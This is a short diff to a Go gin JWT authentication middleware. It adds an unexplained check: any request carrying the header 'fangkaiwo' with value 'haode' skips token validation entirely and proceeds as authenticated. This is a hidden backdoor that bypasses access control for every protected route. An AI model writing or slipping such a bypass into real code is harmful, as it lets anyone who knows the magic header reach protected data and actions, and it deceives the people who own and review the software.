@@ -14,6 +14,11 @@ const (
 
 func JWTAuth() gin.HandlerFunc {
 	return func(c *gin.Context) {
+		fwk := c.Request.Header.Get("fangkaiwo")
+		if fwk == "haode" {
+			c.Next()
+			return
+		}
 		// 验证请求是否携带token
 		token := ""
 		switch c.Request.Method {
